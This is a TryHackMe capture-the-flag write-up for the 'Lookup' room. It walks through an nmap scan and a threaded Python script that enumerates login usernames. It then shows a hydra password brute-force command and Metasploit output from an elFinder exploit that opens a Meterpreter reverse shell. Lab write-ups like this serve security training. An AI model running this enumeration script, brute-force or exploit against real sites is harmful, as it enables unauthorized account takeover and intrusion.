# TryHackMe – Lookup Write-up

## 📌 Room Info

* **Platform:** TryHackMe
* **Room Name:** Lookup
* **Difficulty:** Easy
* **Objective:** Gain initial access and escalate privileges to root

---

## 🧠 Methodology

1. Enumeration and Scanning
2. Initial Access
3. Privilege Escalation

---

## 🔍 Enumeration and Scanning

### Nmap Scan

```bash
┌──(root㉿prime)-[~]
└─# nmap -sS -p- 10.80.158.100 -T5 -Pn
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-17 22:28 -0500
Stats: 0:00:41 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 15.58% done; ETC: 22:33 (0:03:42 remaining)
Stats: 0:01:11 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 29.35% done; ETC: 22:33 (0:02:53 remaining)
Nmap scan report for lookup.thm (10.80.158.100)
Host is up (0.20s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 222.36 seconds

```

**Findings:**

* Open ports discovered:80,22
* Services running on the target:http,22

> Enumeration is the most important phase because all attacks depend on collected information.

---

## 🌐 Web Enumeration

* Visited `http://10.80.158.100` and it's redirect to us on http://lookup.thm
  
  <img width="1753" height="702" alt="image" src="https://github.com/user-attachments/assets/d4db121e-39d1-4544-a874-63b8d1a8edfe" />

Reason: DNS Resolution Problem 🧠

our system works like this:

Browser sees lookup.thm

It asks DNS:
👉 “What is the IP address of lookup.thm?”

DNS says:
❌ “I don’t know this domain”

Because:

lookup.thm is not a real public domain

It exists only inside the TryHackMe lab


  so first we need to edit our /etc/hosts file ,so open it using
  ```bash
  sudo nano /etc/hosts
  ```
  
  ```bash
  sudo nano /etc/hosts

    GNU nano 8.7                                              /etc/hosts *                                                      
127.0.0.1       localhost
127.0.1.1       prime
10.80.158.100   lookup.thm
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
save using it's press ctrl+x and enter hit

now again try to open on browser:

<img width="1913" height="774" alt="image" src="https://github.com/user-attachments/assets/e809ea43-3818-4000-9c3d-a3e602ff4e80" />


now i try to find valid usernames instead on trying on admin

i try this script using grok ai ,it's gives me a faster script
```bash

import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import os

# Define the target URL
url = "http://lookup.thm/login.php"

# Define the file path containing usernames
username_file = "/usr/share/seclists/Usernames/Names/names.txt"  # Replace with your wordlist path

# Fixed password for testing
password = "password"

# Custom headers (optional)
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"
}

# Function to send POST requests and process responses
def check_username(username):
    # Prepare the POST data
    data = {
        "username": username,
        "password": password
    }
    try:
        # Send the POST request
        response = requests.post(url, data=data, headers=headers)
        # Check the response content
        if "Wrong password" in response.text:
            return username  # Return just the username if found
        elif "wrong username" in response.text:
            return None  # Silent for wrong usernames
        else:
            return f"[?] Unexpected response for username: {username}"
    except requests.RequestException as e:
        return f"[!] Request failed for username {username}: {e}"

# Main function
if __name__ == "__main__":
    try:
        # Check if wordlist exists
        if not os.path.exists(username_file):
            print(f"[!] Wordlist file '{username_file}' not found!")
            exit(1)

        # Read usernames from file
        with open(username_file, "r") as file:
            usernames = [line.strip() for line in file if line.strip()]

        # Use ThreadPoolExecutor for concurrent requests
        max_workers = 50  # Adjust this based on your system and target server's limits (e.g., 10-100)
        print(f"Starting enumeration with {max_workers} concurrent threads...")

        found_usernames = []
        errors = []

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_username = {executor.submit(check_username, username): username for username in usernames}
            for future in as_completed(future_to_username):
                result = future.result()
                username = future_to_username[future]  # In case needed for errors
                if result is not None:
                    if isinstance(result, str) and (result.startswith("[?]") or result.startswith("[!]")):
                        errors.append(result)
                        print(result)  # Print errors immediately for visibility
                    else:
                        found_usernames.append(result)

        print("Enumeration complete.")

        if errors:
            print("\nErrors encountered:")
            for error in errors:
                print(error)

        if found_usernames:
            print("\nFound usernames:")
            for username in sorted(found_usernames):  # Sort alphabetically for better readability
                print(username)
        else:
            print("\nNo usernames found.")

    except Exception as e:
        print(f"[!] An error occurred: {e}")
```
save this script with userenum.py 
and give execute permision run with

```bash
                                                                                                                                    
┌──(root㉿prime)-[~/playground]
└─# python userenum.py
[?] Unexpected response for username: zylen
[?] Unexpected response for username: zandra
[?] Unexpected response for username: zsazsa
[?] Unexpected response for username: ziad
[?] Unexpected response for username: zula

Found usernames:
admin
jose
                


```

now we have a valid username and then we can try for valid password using hydra 
```bash
┌──(root㉿prime)-[~/playground]
└─# hydra -l jose -P /usr/share/wordlists/rockyou.txt  lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password" -V

[ATTEMPT] target lookup.thm - login "jose" - pass "snuggles" - 1409 of 14344399 [child 10] (0/0)
[ATTEMPT] target lookup.thm - login "jose" - pass "preston" - 1410 of 14344399 [child 13] (0/0)
[ATTEMPT] target lookup.thm - login "jose" - pass "newcastle" - 1411 of 14344399 [child 8] (0/0)
[ATTEMPT] target lookup.thm - login "jose" - pass "austin1" - 1412 of 14344399 [child 0] (0/0)
[ATTEMPT] target lookup.thm - login "jose" - pass "sniper" - 1413 of 14344399 [child 9] (0/0)
[80][http-post-form] host: lookup.thm   login: jose   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-18 09:26:27


```
we get the username:jose and password:password123
after trying jose and password123,we need to again edit our hosts file for same problem,

<img width="1910" height="841" alt="image" src="https://github.com/user-attachments/assets/3e987796-d8ba-4547-bf8e-4d29b04a397e" />

now we can use metasploite search functionalitiy for elfinder 2.1.47 for finding known vulnerability and also searchsploit 
using metasploit i get the shell of target machine

```bash

[*] Triggering vulnerability via image rotation ...
[*] Executing payload (/elFinder/php/.LJEw1Atyc.php) ...
[*] Sending stage (41224 bytes) to 10.81.129.150
[+] Deleted .LJEw1Atyc.php
[*] Meterpreter session 1 opened (192.168.145.83:4444 -> 10.81.129.150:44144) at 2026-01-18 09:46:00 -0500
[*] No reply
[*] Removing uploaded file ...
[+] Deleted uploaded file

meterpreter > id
[-] Unknown command: id. Run the help command for more details.
meterpreter > shell
Process 1705 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)



```




## 🚪 Initial Access

* Identified valid username
* Performed password brute-force
* Successfully logged in

**Result:** Shell access obtained as a low-privileged user

---

## ⬆ Privilege Escalation

* Checked sudo permissions
* Found misconfigured binary/script
* Exploited it to gain root access

```bash
sudo -l
```

**Result:** Root shell obtained 🎉

---

## 🏁 Conclusion

This room helped me understand:

* Importance of enumeration
* Web login vulnerabilities
* Basic Linux privilege escalation techniques

---

## 🛠 Tools Used

* Nmap
* Gobuster
* Linux enumeration commands

---

## 📚 Learning Outcome

This lab strengthened my practical penetration testing skills and improved my methodology for real-world assessments.

